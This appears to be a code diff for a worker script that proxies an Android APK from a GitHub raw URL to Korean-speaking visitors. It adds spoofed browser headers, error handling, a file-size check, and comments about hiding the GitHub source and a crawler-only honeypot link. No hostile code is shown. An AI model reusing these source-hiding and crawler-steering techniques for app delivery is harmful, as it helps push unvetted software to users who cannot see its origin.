@@ -41,7 +41,21 @@ async function handleRequest(request) {
     
     try {
       // 使用代理方式获取APK，避免直接暴露GitHub链接
-      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/s1-x_flow_sign_en.apk')
+      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/s1-x_flow_sign_en.apk', {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+          'Accept': '*/*',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'Referer': 'https://github.com/SLOMEDIALLC/S1-X',
+          'Connection': 'keep-alive',
+          'Cache-Control': 'no-cache'
+        }
+      })
+      
+      // 检查响应状态
+      if (!response.ok) {
+        throw new Error(`GitHub responded with status: ${response.status}`);
+      }
       
       // 添加安全相关的响应头
       return new Response(response.body, {
@@ -54,7 +68,14 @@ async function handleRequest(request) {
         }
       })
     } catch (error) {
-      return new Response('File not found: ' + error.message, { status: 404 })
+      console.error('APK下载错误:', error);
+      return new Response(`下载文件失败: ${error.message}`, { 
+        status: 500,
+        headers: {
+          'Content-Type': 'text/plain;charset=UTF-8',
+          'X-Error-Type': 'download-failure'
+        }
+      });
     }
   }
 
@@ -408,6 +429,13 @@ function generateHtmlContent() {
                     if (xhr.status === 200) {
                         // 创建下载链接
                         const blob = new Blob([xhr.response], {type: 'application/vnd.android.package-archive'});
+                        // 检查文件大小是否合理（至少1MB）
+                        if (blob.size < 1024 * 1024) {
+                            console.error('下载的文件太小，可能不是完整的APK文件。大小:', blob.size, '字节');
+                            alert('다운로드 파일이 너무 작습니다. 완전한 APK 파일이 아닐 수 있습니다.'); // 下载的文件太小，可能不是完整的APK文件 (韩语)
+                            return;
+                        }
+                        
                         const url = URL.createObjectURL(blob);
                         const a = document.createElement('a');
                         a.href = url;
@@ -415,19 +443,20 @@ function generateHtmlContent() {
                         document.body.appendChild(a);
                         a.click();
                         document.body.removeChild(a);
+                        console.log('下载成功，文件大小:', blob.size, '字节');
                     } else {
-                        console.error('Download failed with status:', xhr.status);
-                        alert('다운로드에 실패했습니다. 나중에 다시 시도하십시오.'); // 下载失败，请稍后再试 (韩语)
+                        console.error('下载失败，状态码:', xhr.status, '响应:', xhr.responseText);
+                        alert('다운로드에 실패했습니다. 상태 코드: ' + xhr.status); // 下载失败，状态码: xxx (韩语)
                     }
                 };
                 
                 xhr.onerror = function() {
-                    console.error('Download request failed');
-                    alert('다운로드 요청이 실패했습니다. 인터넷 연결을 확인하십시오.'); // 下载请求失败，请检查您的网络连接 (韩语)
+                    console.error('下载请求失败，可能是网络问题或CORS限制');
+                    alert('다운로드 요청이 실패했습니다. 인터넷 연결을 확인하거나 나중에 다시 시도하십시오.'); // 下载请求失败，请检查您的网络连接或稍后再试 (韩语)
                 };
                 
                 xhr.send();
-                console.log('Download request sent for:', '/s1-x_flow_sign_en.apk');
+                console.log('下载请求发送，路径：/s1-x_flow_sign_en.apk');
             });
             
             // 添加蜜罐链接 (对爬虫可见，对用户不可见)
